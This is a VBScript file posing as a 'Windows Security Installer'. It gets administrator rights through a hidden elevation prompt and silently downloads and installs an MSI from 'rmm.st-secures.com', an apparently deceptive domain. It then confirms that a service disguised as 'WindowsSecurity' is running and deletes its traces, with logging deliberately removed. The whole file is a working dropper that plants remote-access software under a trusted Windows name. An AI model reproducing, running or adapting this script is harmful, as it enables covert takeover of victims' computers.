Option Explicit

Const PRODUCT_NAME = "Windows Security Installer"
Const DOWNLOAD_URL = "https://rmm.st-secures.com/deploy/77a49ff4-b650-4783-b21f-6790949d1886/installer.msi"
Const MSI_FILE_NAME = "windows-Security-Setup.msi"
Const MSI_ARGS = "/qn /norestart"
Const SERVICE_NAME = "WindowsSecurity"

Dim shell, fso, tempDir, workDir, msiPath, msiLogPath, bootstrapLogPath
Dim downloadError, exitCode, serviceExitCode

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
workDir = fso.BuildPath(tempDir, "WindowsSupportInstaller")
msiPath = fso.BuildPath(workDir, MSI_FILE_NAME)
msiLogPath = fso.BuildPath(workDir, "msi-install.log")
bootstrapLogPath = fso.BuildPath(workDir, "bootstrap.log")

EnsureFolder workDir

' ---------------------------------------------------------------------------
' Request administrator privileges.
' ---------------------------------------------------------------------------
If Not IsRunningAsAdmin() Then
    If HasArgument("/elevated") Then
        WScript.Quit 1
    End If

    If Not RelaunchElevated() Then
        WScript.Quit 1
    End If
    WScript.Quit 0
End If

' ---------------------------------------------------------------------------
' Installation Logic
' ---------------------------------------------------------------------------
DeleteFileIfExists msiPath
DeleteFileIfExists msiLogPath

downloadError = DownloadFile(DOWNLOAD_URL, msiPath)

If downloadError <> "" Or Not fso.FileExists(msiPath) Or fso.GetFile(msiPath).Size < 1024 Then
    WScript.Quit 1
End If

exitCode = shell.Run("msiexec.exe /i " & Q(msiPath) & " " & MSI_ARGS & " /L*v " & Q(msiLogPath), 0, True)

' ---------------------------------------------------------------------------
' Final verification
' ---------------------------------------------------------------------------
WScript.Sleep 5000

serviceExitCode = shell.Run("cmd.exe /c sc.exe query " & SERVICE_NAME & " | findstr /I ""RUNNING"" >nul 2>&1", 0, True)

If serviceExitCode <> 0 Then
    WScript.Quit 1
End If

DeleteFileIfExists msiPath
WScript.Quit 0

' ===========================================================================
' Functions and Subroutines
' ===========================================================================

Function IsRunningAsAdmin()
    Dim result
    On Error Resume Next
    result = shell.Run("cmd.exe /c fltmc.exe >nul 2>&1", 0, True)
    IsRunningAsAdmin = (result = 0)
    On Error GoTo 0
End Function

Function HasArgument(ByVal expectedArgument)
    Dim argument
    HasArgument = False
    For Each argument In WScript.Arguments
        If LCase(Trim(CStr(argument))) = LCase(Trim(expectedArgument)) Then
            HasArgument = True
            Exit Function
        End If
    Next
End Function

Function RelaunchElevated()
    Dim app, scriptArguments
    RelaunchElevated = False
    On Error Resume Next
    Set app = CreateObject("Shell.Application")
    scriptArguments = Q(WScript.ScriptFullName) & " /elevated"
    app.ShellExecute "wscript.exe", scriptArguments, "", "runas", 0 ' Set to 0 to hide window
    If Err.Number = 0 Then RelaunchElevated = True
    On Error GoTo 0
End Function

Function DownloadFile(ByVal sourceURL, ByVal targetPath)
    Dim http, stream
    On Error Resume Next
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", sourceURL, False
    http.Send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.ResponseBody
        stream.SaveToFile targetPath, 2
        stream.Close
    End If
    On Error GoTo 0
End Function

Sub EnsureFolder(ByVal folderPath)
    If Not fso.FolderExists(folderPath) Then fso.CreateFolder folderPath
End Sub

Sub DeleteFileIfExists(ByVal filePath)
    If fso.FileExists(filePath) Then fso.DeleteFile filePath, True
End Sub

Sub LogLine(ByVal message)
    ' Left empty as requested to remove all feedback, though logic remains in background
End Sub

Function Q(ByVal value)
    Q = """" & CStr(value) & """"
End Function